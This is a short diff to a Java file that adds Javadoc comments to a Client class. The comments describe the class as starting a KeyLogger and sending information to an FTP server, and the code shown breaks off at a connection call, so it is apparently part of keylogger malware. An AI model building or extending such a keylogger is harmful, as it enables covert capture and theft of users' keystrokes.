@@ -1,7 +1,16 @@
 package org.dot;
 
+/**
+ * A class that starts <code>{@link org.dot.KeyLogger}</code> and sends information to FTP-server.
+ * 
+ * @author dovaogedot
+ * @see org.dot.Server
+ */
 public class Client {
 
+	/**
+	 * Base constructor.
+	 */
 	public Client() {
 		try {
 			if (!FTPManager.connect())
